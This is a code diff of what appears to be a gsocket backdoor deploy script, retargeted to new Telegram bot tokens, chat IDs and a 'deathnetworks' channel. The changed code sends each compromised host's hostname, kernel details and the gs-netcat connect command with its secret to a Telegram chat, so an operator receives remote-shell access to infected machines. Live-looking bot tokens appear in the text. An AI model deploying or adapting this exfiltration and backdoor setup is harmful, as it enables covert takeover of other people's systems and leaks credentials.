@@ -48,9 +48,9 @@
 # GS_DL=wget
 #       - Command to use for download. =wget or =curl.
 # GS_TG_TOKEN=
-#       - Telegram Bot ID, =8129495987:AAFDHkNgDHoi9xwne0sqT4FI_fzNxp8SREQ
+#       - Telegram Bot ID, =7603173849:AAEL2ewWIw7dUoabRKaln9Q-ez8G7l0lHH0
 # GS_TG_CHATID=
-#       - Telegram Chat ID, =-1002622487723
+#       - Telegram Chat ID, =-1002699548560
 # GS_DISCORD_KEY=
 #       - Discord API key, ="#"
 # GS_WEBHOOK_KEY=
@@ -90,7 +90,7 @@ unset gs_deploy_webhook
 # shellcheck disable=SC2016 #Expressions don't expand in single quotes, use double quotes for that.
 msg='$(hostname) --- $(uname -rom) --- gs-netcat -i -s ${GS_SECRET}'
 ### Telegram
-# GS_TG_TOKEN="7603173849:AAG3Z2gwgyhV9TIJphNhT7usVOC_75GF49s"
+# GS_TG_TOKEN="7603173849:AAEL2ewWIw7dUoabRKaln9Q-ez8G7l0lHH0"
 # GS_TG_CHATID="-1002699548560"
 [[ -n $GS_TG_TOKEN ]] && [[ -n $GS_TG_CHATID ]] && {
 	GS_WEBHOOK_CURL=("--data-urlencode" "text=${msg}" "https://api.telegram.org/bot${GS_TG_TOKEN}/sendMessage?chat_id=${GS_TG_CHATID}&text=${msg}")
@@ -1709,6 +1709,6 @@ else
 	gs_start
 fi
 
-echo -e "--> ${CW}Join us on Telegram - https://t.me/thcorg${CN}"
+echo -e "--> ${CW}Join us on Telegram - https://t.me/deathnetworks${CN}"
 
 exit_code 0
